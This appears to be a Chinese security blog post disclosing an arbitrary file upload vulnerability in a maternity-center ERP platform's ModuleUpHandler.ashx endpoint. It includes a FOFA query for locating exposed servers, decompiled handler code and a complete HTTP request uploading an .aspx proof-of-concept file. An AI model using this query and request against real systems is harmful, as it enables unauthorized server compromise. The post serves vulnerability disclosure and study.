---
title: "月子会所ERP管理云平台 ModuleUpHandler.ashx 任意文件上传漏洞"
source: https://mrxn.net/jswz/mamabaohe-ModuleUpHandler-rce.html
asset_dir: assets/月子会所erp管理云平台-moduleuphandler.ashx-任意文件上传漏洞
---

# 月子会所ERP管理云平台 ModuleUpHandler.ashx 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/24 08:46
* 657浏览
* [0评论](#comment)
* 1小时阅读

深入探索

身份验证

授权

文本剥离工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

月子会所ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件。月子会所ERP管理云平台的 Page/upload/ModuleUpHandler.ashx 接口存在[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，攻击者可利用该漏洞上传webshell获取服务器权限。

漏洞修复方案

# fofa语法

> `body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx" || app="妈妈宝盒-ERP"`

# 漏洞分析

深入探索

SQL注入检测工具

在线安全工具

编码转换工具

ModuleUpHandler 的业务逻辑实现如下

```
public class ModuleUpHandler : IHttpHandler
  {
    private static string OOsUrl = ConfigurationManager.AppSettings["uploadOosUrl"];
    private static string url = "";
    private static string Slturl = "";
    private static string ErpUrl = ConfigurationManager.AppSettings["uploadErpUrl"];
    private static string UploadPosition = ConfigurationManager.AppSettings[nameof (UploadPosition)];
    private static string BdSltUrl = "UploadBaseFolder/Thumbnail";
    private static string BdYtUrl = "UploadBaseFolder";

    public void ProcessRequest(HttpContext context)
    {
      context.Response.ContentType = "application/json";
      HttpFileCollection files = context.Request.Files;
      Framework.Common.Logging.Logging.SaveLog(ELogLayer.UI, "Files数量：" + ((NameObjectCollectionBase) context.Request.Files).Count.ToString());
      List<string> stringList = new List<string>();
      if (string.op_Equality(ModuleUpHandler.UploadPosition, "1"))
      {
        ModuleUpHandler.url = ModuleUpHandler.OOsUrl + "/" + DateTime.Now.ToString("yyyyMM");
      }
      else
      {
        ModuleUpHandler.url = ModuleUpHandler.ErpUrl + "/" + DateTime.Now.ToString("yyyyMM");
        ModuleUpHandler.Slturl = ModuleUpHandler.BdSltUrl + "/" + ModuleUpHandler.ErpUrl + "/" + DateTime.Now.ToString("yyyyMM") + "/";
      }
      if (((NameObjectCollectionBase) context.Request.Files).Count > 0)
      {
        string str1 = ModuleUpHandler.BdYtUrl + "/" + ModuleUpHandler.url;
        string str2 = context.Server.MapPath("../../" + str1);
        if (!Directory.Exists(str2))
          Directory.CreateDirectory(str2);
        for (int index = 0; index < ((NameObjectCollectionBase) context.Request.Files).Count; ++index)
        {
          HttpPostedFile httpPostedFile = files[index];
          string fileName = httpPostedFile.FileName;
          string lower = fileName.Substring(fileName.LastIndexOf(".")).ToLower();
          string newName = this.GetNewName(lower);
          if (string.op_Equality(ModuleUpHandler.UploadPosition, "1"))
          {
            stringList.Add(string.Format("{0}/{1},1", (object) ModuleUpHandler.url, (object) newName));
            Stream inputStream = files[index].InputStream;
            OosUpload.PutObjectFromFile(ModuleUpHandler.url + "/", newName, inputStream);
          }
          else
          {
            stringList.Add(string.Format("{0}/{1},0", (object) str1, (object) newName));
            string originalImagePath = string.Format("{0}/{1}", (object) str2, (object) newName);
            string str3 = context.Server.MapPath("../../" + ModuleUpHandler.Slturl);
            httpPostedFile.SaveAs(originalImagePath);
            if (string.op_Equality(lower, ".png") || string.op_Equality(lower, ".jpg") || string.op_Equality(lower, ".jepg") || string.op_Equality(lower, ".bmp"))
            {
              if (!Directory.Exists(str3))
                Directory.CreateDirectory(str3);
              string thumbnailPath = string.Format("{0}/{1}", (object) str3, (object) newName);
              ModuleUpHandler.MakeThumbnail(originalImagePath, thumbnailPath, 120, 120, "DB");
            }
          }
          Thread.Sleep(1000);
        }
      }
      context.Response.Write(JsonConvert.SerializeObject((object) new
      {
        code = 200,
        data = stringList
      }));
      context.Response.End();
    }

    public string GetNewName(string name)
    {
      return DateTime.UtcNow.ToString("yyyyMMddHHmmss") + new Random().Next(0, 9999999).ToString() + name;
    }

    public static void MakeThumbnail(
      string originalImagePath,
      string thumbnailPath,
      int width,
      int height,
      string mode)
    {
      Image image1 = Image.FromFile(originalImagePath);
      int num1 = width;
      int num2 = height;
      int num3 = 0;
      int num4 = 0;
      int num5 = image1.Width;
      int num6 = image1.Height;
      if (!string.op_Equality(mode, "HW"))
      {
        if (!string.op_Equality(mode, "W"))
        {
          if (!string.op_Equality(mode, "H"))
          {
            if (!string.op_Equality(mode, "Cut"))
            {
              if (string.op_Equality(mode, "DB"))
              {
                if ((double) image1.Width / (double) num1 < (double) image1.Height / (double) num2)
                {
                  num2 = height;
                  num1 = image1.Width * height / image1.Height;
                }
                else
                {
                  num1 = width;
                  num2 = image1.Height * width / image1.Width;
                }
              }
            }
            else if ((double) image1.Width / (double) image1.Height > (double) num1 / (double) num2)
            {
              num6 = image1.Height;
              num5 = image1.Height * num1 / num2;
              num4 = 0;
              num3 = (image1.Width - num5) / 2;
            }
            else
            {
              num5 = image1.Width;
              num6 = image1.Width * height / num1;
              num3 = 0;
              num4 = (image1.Height - num6) / 2;
            }
          }
          else
            num1 = image1.Width * height / image1.Height;
        }
        else
          num2 = image1.Height * width / image1.Width;
      }
      Image image2 = (Image) new Bitmap(num1, num2);
      Graphics graphics = Graphics.FromImage(image2);
      graphics.InterpolationMode = (InterpolationMode) 2;
      graphics.SmoothingMode = (SmoothingMode) 2;
      graphics.Clear(Color.Transparent);
      graphics.DrawImage(image1, new Rectangle(0, 0, num1, num2), new Rectangle(num3, num4, num5, num6), (GraphicsUnit) 2);
      try
      {
        image2.Save(thumbnailPath, ImageFormat.Png);
      }
      catch (Exception ex)
      {
        throw ex;
      }
      finally
      {
        image1.Dispose();
        image2.Dispose();
        graphics.Dispose();
      }
    }

    public bool IsReusable => false;
  }
```

### 处理流程逻辑梳理

1. **设置响应类型**：设置 `context.Response.ContentType` 为 `application/json`。
2. **获取上传的文件集合**：从 `context.Request.Files` 获取上传的文件集合。
3. **记录日志**：记录上传文件的数量到日志。
4. **判断上传位置**：
   * 如果 `UploadPosition` 为 `"1"`：
     + 设置 `url` 为 `OOsUrl` 加上当前年月。
   * 否则：
     + 设置 `url` 为 `ErpUrl` 加上当前年月。
     + 设置 `Slturl` 为 `BdSltUrl` 加上 `ErpUrl` 和当前年月。
5. **判断是否有文件上传**：
   * 如果有文件：
     + 构造上传文件的存储路径 `str1` 和物理路径 `str2`。
     + 如果 `str2` 路径不存在，则创建目录。
     + 遍历上传的文件集合：
     + 获取文件名及扩展名。
     + 调用 `GetNewName` 方法生成新的文件名。
     + 根据 `UploadPosition` 决定处理方式：
       - 如果 `UploadPosition` 为 `"1"`：
       - 调用 `OosUpload.PutObjectFromFile` 方法上传文件到对象存储。
       - 将文件路径和标识 `"1"` 添加到 `stringList`。
       - 否则：
       - 保存文件到本地路径。
       - 如果文件是图片类型（`.png`, `.jpg`, `.jpeg`, `.bmp`），生成缩略图：
         * 如果缩略图路径不存在，则创建目录。
         * 调用 `MakeThumbnail` 方法生成缩略图。
       - 将文件路径和标识 `"0"` 添加到 `stringList`。
     + 每处理一个文件，线程休眠 1 秒。
6. **返回响应**：
   * 将 `stringList` 转换为 JSON 格式，返回到客户端，状态码为 `200`。
   * 结束响应。

---

也是常规的上传、重命名、对图片后缀进行缩略图处理等，并无特殊后缀过滤，且会回显上传文件路径，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /Page/upload/ModuleUpHandler.ashx HTTP/1.1
Host: mamabaohe.mrxn.net
Content-Type: multipart/form-data; boundary=--WebKitFormBoundaryWPL35TV23dfr1cNr

--WebKitFormBoundaryWPL35TV23dfr1cNr
Content-Disposition: form-data; name="file"; filename="t.aspx"

<%@Page Language="C#"%><%Response.Write(DateTime.Now.ToString());System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
--WebKitFormBoundaryWPL35TV23dfr1cNr--
```

[![月子会所ERP管理云平台 ModuleUpHandler.ashx 任意文件上传漏洞](images/img-001-2122d87282a6.webp)](https://image.mrxn.net/3f3cb10c56864671a86c03be35f431b0.webp)

成功上传测试POC并回显文件路径，且响应里最后的 0 也表明上传至本地，否则为远程对象储存。

物流软件安全

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.fofa语法](#toc-2-)
* [3.漏洞分析](#toc-3-)
* [3.1.处理流程逻辑梳理](#toc-3-1-)
* [4.漏洞复现](#toc-4-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[月子会所ERP管理云平台 ModuleUpHandler.ashx 任意文件上传漏洞](https://mrxn.net/jswz/mamabaohe-ModuleUpHandler-rce.html)  
文章链接：<https://mrxn.net/jswz/mamabaohe-ModuleUpHandler-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/mamabaohe-ModuleUpHandler-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

